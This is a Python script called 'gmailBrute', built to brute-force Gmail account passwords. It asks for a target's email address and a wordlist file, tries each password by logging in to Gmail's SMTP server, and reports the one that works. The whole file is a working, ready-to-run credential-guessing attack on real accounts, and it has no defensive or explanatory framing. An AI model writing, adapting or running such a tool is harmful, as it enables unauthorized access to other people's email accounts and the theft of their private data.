import smtplib
from os import system


smtpserver = smtplib.SMTP('smtp.gmail.com', 587)
smtpserver.ehlo()
smtpserver.starttls()

def banner():
	print("                        __ __ __                __  	       \n")
	print(" .-----.--------.---.-.|__|  |  |--.----.--.--.|  |_.-----. \n")
	print(" |  _  |        |  _  ||  |  |  _  |   _|  |  ||   _|  -__| \n")
	print(" |___  |__|__|__|___._||__|__|_____|__| |_____||____|_____| \n")
	print(" |_____|                                                    \n")
banner()



creator = "					creator: DevDeclann (2/27/2021)	"
version = "					      gmailBrute: v.1.0		"
print(creator)
print(version)

user = input("Enter targets email address: ")
passwordf = input("Enter Dictionary File: ")

print('\n')
file = open(passwordf, 'r')

for password in file:
    password = password.strip('\n')

    try:
        smtpserver.login(user, password)
        print("[+] password found!: => %s" % password)
        break
    except smtplib.SMTPAuthenticationError:
        print("[-] wrong password defined: => " + password)

input()
